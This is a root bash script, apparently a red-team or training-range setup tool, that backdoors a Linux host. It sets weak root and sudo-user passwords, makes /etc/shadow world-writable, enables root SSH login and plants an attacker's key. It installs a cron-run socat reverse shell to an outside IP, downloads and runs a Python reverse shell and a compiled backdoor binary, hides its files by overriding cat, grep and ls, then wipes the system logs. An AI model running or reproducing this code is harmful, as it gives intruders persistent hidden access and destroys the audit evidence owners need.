#!/bin/bash

# Ensure the script is run as root
if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root" 1>&2
    exit 1
fi

# Update and upgrade packages
DEBIAN_FRONTEND=noninteractive apt-get update -y && apt-get upgrade -y -o Dpkg::Options::="--force-confold"

### Users and Permissions

# Set root password
echo 'root:password' | chpasswd

# Add unauthorized user non-interactively
useradd -m -s /bin/bash system32 || true # In case user exists, continue
echo 'system32:password' | chpasswd
usermod -aG sudo system32

# Weak File Permissions
chmod 777 /etc/shadow
chmod 777 /etc/passwd

### SSH Configs
ssh_config_file="/etc/ssh/sshd_config"

# Permit Root Login
sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' "$ssh_config_file"
systemctl restart sshd

# SSH key to add
SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCt7WC/rLWCNHaSJ9oujUDK+8Pb/ey1BhFxRZFmdyeKCsGSJeWr4yIKLAcvbrMFhhoXoeXRlf+dpurErgrBbUofmHye71Hg7nhceI92w0mKUw4vwV2/x6BC1Hgf0Memy24SJGgjcemqRAyJE5jwn1mlp6qPXFIMM1QyqBNgkCjy/4JNKlL0y0Up/vrfvBNtQtwMlN1DnV5exbjg5WoeKLEYS9Vn/Y3kcYj0aB/yoPa9V87B49XREAajtcmu+a/0hoiwoTDvAtBCs8ucO55XsHnDtxra0s7DxgAe2Ge4oM3UWStvPorp4vtVCn9WTC/3gyLQK/AkWL31FK48oc/WCSPXhROUKiyIXfO0zOkf4NoSJs8zwzEBeRlUOQGhIcyVsBMMjVjnsepx58DMHz4TE2jqIJkRTweKyk0uzFc//u4KjKhVNUxYQ9sZZ7UYfklskWGecv5MoQJIknwWFZWO3TuiNnQsi0gzSIabIXE1Et0Ku4FnEnkH9OvtmSOpcQ37NZk= kali@kali"

# Path for root's authorized_keys file
AUTHORIZED_KEYS="/root/.ssh/authorized_keys"

# Install the SSH Key with correct permissions
chmod 700 "/root/.ssh"
echo "$SSH_KEY" >> "$AUTHORIZED_KEYS"
chmod 600 "$AUTHORIZED_KEYS"

### Shells
# Install socat
DEBIAN_FRONTEND=noninteractive apt-get install socat -y

# Hide a Shell
mkdir -p /var/.lib/.nope
cat <<EOF > /var/.lib/.nope/back.sh 
#!/bin/bash
while true; do
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:24.96.47.160:4444
    sleep 300
done
EOF
chmod +x /var/.lib/.nope/back.sh

# Add the Shell to crontab
CRON_JOB="*/10 * * * * /var/.lib/.nope/back.sh >/dev/null 2>&1"
(crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -

# Fun stuff with commands! ;)
echo 'cat() { command cat "$@" | awk "NR % 2 == 0"; }' >> /etc/bash.bashrc
echo 'grep() { command grep --exclude-dir=.nope --exclude="*socat" "$@"; }' >> /etc/bash.bashrc
echo 'ls() { command ls --color=auto "$@" | grep -vE "back\.(sh|py)$|golden_egg$"; }' >> /etc/bash.bashrc

# Add a Python Reverse Shell
# Ensure python3 installed
DEBIAN_FRONTEND=noninteractive apt-get install python3 -y

sudo curl -s -o ~/back.py https://raw.githubusercontent.com/Oseid/python-reverse-shell
python3 back.py </dev/null >/dev/null 2>&1 &

### Install and schedule a Backdoor Binary
# Get the code to compile
mkdir /etc/goose
sudo curl -s -o /etc/goose/golden_egg.c https://raw.githubusercontent.com/infiniteaxon/VulnServer/main/backdoor.c

# Hint
echo "You're in the correct directory!" >> /etc/goose/egg

# Ensure gcc installed
DEBIAN_FRONTEND=noninteractive apt-get install build-essential -y

# Compile and remove source code
gcc -o /etc/goose/golden_egg /etc/goose/golden_egg.c
rm /etc/goose/golden_egg.c

# Run the binary in background
nohup /etc/goose/golden_egg </dev/null >/dev/null 2>&1 &

# Clear logs
> /var/log/syslog
> /var/log/wtmp
> /var/log/auth.log
> /var/log/kern.log
> /var/log/dpkg.log
> /var/log/boot.log
> /root/.bash_history

# Remove Script
rm wand.sh
